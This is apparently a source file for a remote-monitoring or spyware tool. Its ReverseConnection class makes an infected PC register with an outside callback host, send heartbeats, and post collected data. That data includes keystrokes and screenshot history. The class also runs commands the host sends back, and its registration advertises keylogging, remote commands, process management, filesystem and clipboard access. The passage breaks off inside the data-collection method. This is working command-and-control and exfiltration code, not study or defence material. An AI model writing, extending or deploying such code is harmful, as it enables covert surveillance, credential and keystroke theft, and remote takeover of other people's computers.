import threading
import time
import requests
from datetime import datetime

class ReverseConnection:
    """Enhanced reverse connection - server auto-registers with client"""
    
    def __init__(self, config, pc_id, api_key, get_monitoring_status, get_events, 
                 get_keystrokes, get_screenshot_history, start_monitoring_func, 
                 stop_monitoring_func, take_screenshot_func, get_local_ip_func):
        self.callback_url = config.get('callback_url')
        self.callback_key = config.get('callback_key')
        self.interval = config.get('interval', 15)
        self.heartbeat_interval = config.get('heartbeat_interval', 5)
        self.retry_interval = config.get('retry_interval', 10)
        self.enabled = config.get('enabled', False)
        self.running = True
        self.connected = False
        self.registered = False
        self.last_heartbeat = None
        
        self.pc_id = pc_id
        self.api_key = api_key
        self.server_config = config
        self.get_monitoring_status = get_monitoring_status
        self.get_events = get_events
        self.get_keystrokes = get_keystrokes
        self.get_screenshot_history = get_screenshot_history
        self.start_monitoring = start_monitoring_func
        self.stop_monitoring = stop_monitoring_func
        self.take_screenshot = take_screenshot_func
        self.get_local_ip = get_local_ip_func
        
    def start(self):
        """Start the reverse connection thread"""
        if not self.enabled:
            print("Reverse connection disabled")
            return
        
        thread = threading.Thread(target=self._callback_loop, daemon=True)
        thread.start()
        
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        print(f" Reverse connection enabled - will connect to {self.callback_url}")
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats to maintain connection"""
        while self.running:
            if self.connected:
                try:
                    response = requests.post(
                        f"{self.callback_url}/heartbeat",
                        json={
                            "pc_id": self.pc_id,
                            "pc_name": self.server_config.get('pc_name', 'Unknown'),
                            "timestamp": datetime.now().isoformat()
                        },
                        headers={'X-Callback-Key': self.callback_key},
                        timeout=3
                    )
                    
                    if response.status_code == 200:
                        self.last_heartbeat = datetime.now()
                    else:
                        self.connected = False
                        self.registered = False
                        print(f" Lost connection to client (heartbeat failed)")
                        
                except Exception:
                    self.connected = False
                    self.registered = False
                    
            time.sleep(self.heartbeat_interval)
    
    def _callback_loop(self):
        """Main loop that sends data back to client"""
        while self.running:
            try:
                if not self.connected:
                    if self._register_with_client():
                        self.connected = True
                        self.registered = True
                        print(f" Registered with client at {self.callback_url}")
                    else:
                        time.sleep(self.retry_interval)
                        continue
                
                data = self._collect_data()
                
                response = requests.post(
                    f"{self.callback_url}/callback",
                    json=data,
                    headers={'X-Callback-Key': self.callback_key},
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('commands'):
                        for command in result['commands']:
                            self._handle_command(command)
                    
                    time.sleep(self.interval)
                else:
                    raise Exception(f"Bad response: {response.status_code}")
                    
            except Exception as e:
                if self.connected:
                    print(f" Lost connection to client: {e}")
                    self.connected = False
                    self.registered = False
                
                time.sleep(self.retry_interval)
    
    def _register_with_client(self):
        """Register this server with the client"""
        try:
            local_ip = self.get_local_ip()
            
            registration_data = {
                "type": "register",
                "pc_id": self.pc_id,
                "pc_name": self.server_config.get('pc_name', 'Unknown'),
                "server_url": f"http://{local_ip}:{self.server_config['port']}",
                "api_key": self.api_key,
                "timestamp": datetime.now().isoformat(),
                "capabilities": {
                    "monitoring": True,
                    "screenshots": True,
                    "keylogging": True,
                    "remote_commands": True,
                    "process_management": True,
                    "filesystem": True,
                    "clipboard": True
                }
            }
            
            response = requests.post(
                f"{self.callback_url}/register",
                json=registration_data,
                headers={'X-Callback-Key': self.callback_key},
                timeout=5
            )
            
            if response.status_code == 200:
                return True
            else:
                print(f"Registration failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"Registration error: {e}")
            return False
    
    def _collect_data(self):
        """Collect data to